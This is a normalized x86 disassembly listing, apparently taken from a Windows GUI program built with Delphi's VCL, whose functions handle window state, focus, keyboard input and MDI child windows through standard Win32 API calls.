call [ edx + 0x10 ]
sub_468e04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40cd20
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_468e30
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_4685f0
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_44a074
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_468e88
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_452bc0
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46c46c
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_40338c
sub_468f14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_453a88
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_453a88
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_453a88
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_468fac
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_453a88
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_46858c
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_40338c
sub_469004
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_453fbc
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_469030
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4685f0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_46904c
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_460a28
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_460a28
sub_46908c
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_4690c4
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403f74
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_4690f8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_469249
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469250
lea eax [ ebp - 0x10 ]
call sub_403f20
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_46904c
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_44a018
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_416e0c
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_44cca4
lea eax [ ebp - 0x1c ]
call sub_406b14
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_46904c
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_46908c
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_46d75c
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_46d7c4
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_46d7c4
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_4690c4
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_416e0c
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_44cca4
lea eax [ ebp - 0x1c ]
call sub_406b14
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_46d6f4
test [ esi + 0x228 ] 0x8
je r-xdata
sub_469258
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_4692cc
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_4692f8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452024
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_467308
lea edx [ ebp - 0x14 ]
call sub_46aad0
push ebp
mov eax [ ebp - 0x4 ]
call sub_467308
lea edx [ ebp - 0x24 ]
call sub_46aad0
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_4692cc
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_467308
lea edx [ ebp - 0x24 ]
call sub_46aad0
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_4692cc
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_4692cc
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4692cc
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_4693b0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_40338c
pop esi
pop ebx
retn
sub_4693d4
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_40338c
pop esi
pop ebx
retn
sub_4693f8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_452f04
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_453fbc
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_453fbc
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_469494
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4699fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_46dba8
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_4699e1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4699e8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
xor eax eax
push ebp
push sub_4698e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_40338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_46954c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_40338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_468640
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_450fe0
jmp r-xdata
mov eax [ rw-data ]
call sub_46ad2c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44cb90
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_453a88
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_46ad20
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44cbd4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_453a88
call sub_46429c
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_46ad5c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44cb90
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_46ad2c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_44d3ec
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_46ad50
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44cbd4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_46ad20
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_4678f0
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4678f0
jmp r-xdata
sub_469551
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46d2bc
call sub_4039d8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_46ad2c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44cb90
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_46ad20
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44cbd4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_46ad5c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44cb90
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_46ad2c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4699e8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_44d3ec
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_46ad50
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44cbd4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_46ad20
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_4678f0
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4678f0
jmp r-xdata
sub_4698ed
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46d2bc
call sub_4039d8
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_468640
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_450fe0
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_453a88
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4699e8
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_453a88
call sub_46429c
mov ebx eax
sub_469a34
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
